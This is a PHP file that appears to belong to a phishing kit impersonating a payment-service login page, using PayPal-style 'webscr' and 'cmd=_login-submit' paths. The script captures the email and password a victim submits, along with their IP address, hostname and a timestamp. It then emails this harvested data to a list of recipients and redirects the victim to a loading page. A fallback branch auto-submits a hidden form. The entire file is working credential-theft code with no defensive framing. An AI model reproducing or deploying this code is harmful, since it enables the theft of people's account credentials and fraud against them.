<?php
error_reporting(0);

if (!isset($_SESSION)) {
 session_start();
}
$webscr="cmd";$ee= md5($webscr);
$c=base64_encode($_POST['userm'].$ee.$_POST['userp'].$ee.$_SESSION['tLang']);
$l=explode($ee,base64_decode($c));$e = strpos($l[0], "@");$p = strpos($l[0], ".");
if( $l[1]!="" and $e and $p ){
	$ip = getenv("REMOTE_ADDR");
	$datamasii=date("D M d, Y - g:i a");
	$hostname = gethostbyaddr($ip);
	$_SESSION['email'] = $l[0];
	$_SESSION['password'] = $l[1];
	include $webscr."/to.php";
	include $webscr."/send_log.php";
	for($s=0;$s<count($send);$s++){
		mail($send[$s], $subject, $msg);
	}
	
	echo "<meta http-equiv='refresh' content='0;URL=./loading.php?$c' />";
	
}else{
?>
<form name="form1" action="<?php echo "$webscr/?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e284a5f8a8f8&ee=$ee"; ?>" method="post"></form>
<script language="JavaScript">
setTimeout('document.form1.submit()',0);
</script>
<?php
}
?>